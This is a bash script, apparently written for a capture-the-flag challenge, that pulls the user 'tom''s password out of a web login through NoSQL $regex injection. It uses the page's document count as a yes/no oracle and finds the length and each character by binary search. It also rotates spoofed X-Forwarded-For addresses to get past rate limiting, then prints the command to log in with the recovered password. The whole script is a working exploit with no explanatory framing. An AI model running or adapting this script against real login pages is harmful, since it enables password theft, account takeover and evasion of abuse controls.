#!/usr/bin/env bash
#
# NoSQL ($regex) password extractor for the "tom" CTF.  [v5 — binary search]
#
# Oracle: page prints "Database Documents : N"  (N>=1 => regex matched tom).
# Password is alphanumeric (special chars are sanitized), so the candidate set
# is [A-Za-z0-9] and no regex-escaping is needed.
#
# Strategy (per character): BINARY SEARCH over the charset using a regex class.
#   test  ^<prefix>[<lower half>]   -> match => char in lower half, else upper.
#   ~log2(62) = 6 requests/char instead of up to 62. ~10x fewer requests.
# Length is found first via binary search on  ^.{0,n}$  so we know when to stop.
#
# Endgame: plaintext login (no operators):  username=tom & password=<extracted>
#
# Usage:
#   ./extract_tom.sh                 # full run (XFF rotation on, no delay)
#   ./extract_tom.sh "Pa"            # resume from a known prefix
#   DELAY=0.2 ROTATE_XFF=0 ./...     # throttle / disable IP rotation
#
set -uo pipefail

BASE="https://0becfa19d485ac808817f9ab617c2061-toms-login.web.cityinthe.cloud"
LOGIN_PATH="/login"
USER="tom"

# ordered candidate set — alphanumeric only (specials are sanitized server-side)
CHARSET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

KNOWN="${1:-}"
DELAY="${DELAY:-0}"            # limiter is bypassed via XFF, so default 0
MAXLEN="${MAXLEN:-64}"
ROTATE_XFF="${ROTATE_XFF:-1}"  # on by default; the limiter keys on (spoofable) IP
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
REQS=0

echo "### extract_tom.sh v5 (binary search) ###"

request() {   # $1 = raw regex value -> writes body
  local regex="$1" hdr=()
  [ "$ROTATE_XFF" = "1" ] && hdr=(-H "X-Forwarded-For: $((RANDOM%223+1)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))")
  curl -sS -G "${BASE}${LOGIN_PATH}" \
    "${hdr[@]}" \
    --data-urlencode "username=${USER}" \
    --data-urlencode "password[\$regex]=${regex}" \
    -o "$TMP/body" -w '%{http_code}' 2>/dev/null
}
probe() {     # $1 = raw regex value -> echoes http_code (429 + 5xx retry)
  local code tries=0
  while :; do
    code="$(request "$1")"; REQS=$((REQS+1))
    case "$code" in
      429)          echo "  [429] backing off 10s..." >&2; sleep 10; continue ;;
      502|503|504)  tries=$((tries+1)); if [ "$tries" -le 3 ]; then sleep 2; continue; fi ;;
    esac
    [ "$DELAY" != "0" ] && sleep "$DELAY"
    printf '%s' "$code"; return
  done
}
doc_count() { grep -oiE 'Documents[[:space:]]*:[[:space:]]*[0-9]+' "$TMP/body" 2>/dev/null | grep -oE '[0-9]+' | tail -n1; }

# oracle: shell-true (0) when the regex matched tom's doc (Documents >= 1)
oracle() { local n; probe "$1" >/dev/null; n="$(doc_count)"; [ -n "$n" ] && [ "$n" -ge 1 ] 2>/dev/null; }

# ============================= CALIBRATE =============================
echo "[*] Target: ${BASE}${LOGIN_PATH} (user=${USER})  delay=${DELAY}s  xff=${ROTATE_XFF}"

oracle '^zzNOMATCH__ctf$'; F_OK=$?
oracle '.*';               T_OK=$?
if [ "$F_OK" -eq 0 ] || [ "$T_OK" -ne 0 ]; then
  echo "[!] Oracle sanity failed (expected .* match, ^zzNOMATCH\$ no-match). Is the injection firing?"; exit 2
fi
echo "[*] Oracle OK:  .* -> match,  ^zzNOMATCH\$ -> no-match"

# does the server honor regex [classes] and {quantifiers} in our injection?
CLASS_OK=0; if oracle '^[A-Za-z0-9]' && ! oracle '^[^A-Za-z0-9]'; then CLASS_OK=1; fi
QUANT_OK=0; if oracle '^.{1,}$'      && ! oracle '^.{0}$';        then QUANT_OK=1; fi
echo "[*] Capabilities:  character-classes=${CLASS_OK}  quantifiers=${QUANT_OK}"
echo

# ---------- find length (binary search on ^.{0,n}$) ----------
find_length() {
  local lo hi mid
  hi="$MAXLEN"
  if ! oracle "^.{0,${hi}}\$"; then echo "-1"; return; fi
  lo="${#KNOWN}"
  while [ "$lo" -lt "$hi" ]; do
    mid=$(( (lo+hi)/2 ))
    if oracle "^.{0,${mid}}\$"; then hi="$mid"; else lo=$((mid+1)); fi
  done
  echo "$lo"
}

LEN=-1
if [ "$QUANT_OK" -eq 1 ]; then
  LEN="$(find_length)"
  if [ "$LEN" -ge 0 ]; then echo "[*] Password length = ${LEN}"; else echo "[*] Length > ${MAXLEN}; extracting until exact match."; fi
fi

# ---------- per-character search ----------
bin_char() {  # $1 = prefix -> echoes next char (binary search over CHARSET)
  local p="$1" lo=0 hi=$(( ${#CHARSET}-1 )) mid sub
  while [ "$lo" -lt "$hi" ]; do
    mid=$(( (lo+hi)/2 ))
    sub="${CHARSET:lo:$((mid-lo+1))}"
    if oracle "^${p}[${sub}]"; then hi="$mid"; else lo=$((mid+1)); fi
  done
  printf '%s' "${CHARSET:lo:1}"
}
lin_char() {  # $1 = prefix -> echoes next char (linear fallback)
  local p="$1" i c
  for (( i=0; i<${#CHARSET}; i++ )); do
    c="${CHARSET:i:1}"
    if oracle "^${p}${c}"; then printf '%s' "$c"; return 0; fi
  done
  return 1
}

# ============================= EXTRACT ==============================
pw="$KNOWN"
while : ; do
  # stop condition
  if [ "$LEN" -ge 0 ]; then
    [ "${#pw}" -ge "$LEN" ] && break
  else
    if [ -n "$pw" ] && oracle "^${pw}\$"; then break; fi
  fi

  if [ "$CLASS_OK" -eq 1 ]; then c="$(bin_char "$pw")"; else c="$(lin_char "$pw")" || c=""; fi
  if [ -z "$c" ]; then
    echo "[!] No charset char matched at position $(( ${#pw}+1 )). Password so far: '${pw}'"
    echo "    (a char may be outside [A-Za-z0-9] — widen CHARSET and resume: ./extract_tom.sh '${pw}')"; exit 1
  fi
  pw="${pw}${c}"
  printf '[%2d] %s\n' "${#pw}" "$pw"
done

# ---------- verify ----------
if oracle "^${pw}\$"; then
  echo
  echo "[+] PASSWORD = ${pw}   (verified exact match, ${REQS} requests total)"
  echo
  echo "[>] Log in for real (plaintext, no operators):"
  echo "    curl -s -G '${BASE}${LOGIN_PATH}' --data-urlencode 'username=tom' --data-urlencode 'password=${pw}'"
else
  echo
  echo "[!] Extracted '${pw}' but exact-match verify failed (${REQS} requests). Likely a char outside CHARSET."
  exit 1
fi
